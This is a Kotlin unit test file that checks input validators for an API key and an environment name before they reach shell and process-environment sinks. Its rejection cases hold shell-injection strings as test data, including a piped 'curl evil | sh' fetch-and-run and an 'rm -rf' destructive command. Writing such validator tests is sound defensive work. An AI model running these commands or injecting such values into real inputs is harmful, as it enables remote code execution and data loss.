package com.angussoftware.letta.env

import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Test

/**
 * Sink-validation contract (security set 1, review 2726): these regexes are
 * the LAST line of defense for values interpolated into shell contexts and
 * process environments. Every write path (onboarding, watch key-sync, any
 * future one) must pass through them.
 */
class SinkValidationTest {
    @Test fun key_shape() {
        // valid: sk-let- + base64 family, 20+
        assertEquals("ok", LettaEnvironmentService.validatedKey("sk-let-" + "a".repeat(30))?.let { "ok" })
        assertEquals("ok", LettaEnvironmentService.validatedKey("sk-let-abc123+/=_-XYZ0987654321")?.let { "ok" })
        // invalid: injection attempts, empty, short, wrong prefix, trimmed spaces handled
        assertNull(LettaEnvironmentService.validatedKey("x; curl evil | sh; #sk-let-aaaaaaaaaaaaaaaaaaaa"))
        assertNull(LettaEnvironmentService.validatedKey("sk-let-short"))
        assertNull(LettaEnvironmentService.validatedKey("'; rm -rf; echo '"))
        assertNull(LettaEnvironmentService.validatedKey(""))
        assertNull(LettaEnvironmentService.validatedKey(null))
        // whitespace is trimmed then validated
        // returns-TRIMMED contract (the Accept path commits the returned value)
        assertEquals("sk-let-" + "b".repeat(25), LettaEnvironmentService.validatedKey("  sk-let-" + "b".repeat(25) + "  "))
    }
    @Test fun env_shape() {
        assertEquals("ok", LettaEnvironmentService.validatedEnv("phone")?.let { "ok" })
        assertEquals("ok", LettaEnvironmentService.validatedEnv("a-b_2")?.let { "ok" })
        assertNull(LettaEnvironmentService.validatedEnv("phone'; curl evil; '"))
        assertNull(LettaEnvironmentService.validatedEnv("Has Space"))
        assertNull(LettaEnvironmentService.validatedEnv("-leading-dash"))
        assertNull(LettaEnvironmentService.validatedEnv(""))
        assertNull(LettaEnvironmentService.validatedEnv(null))
        assertNull(LettaEnvironmentService.validatedEnv("a".repeat(65)))
    }
}
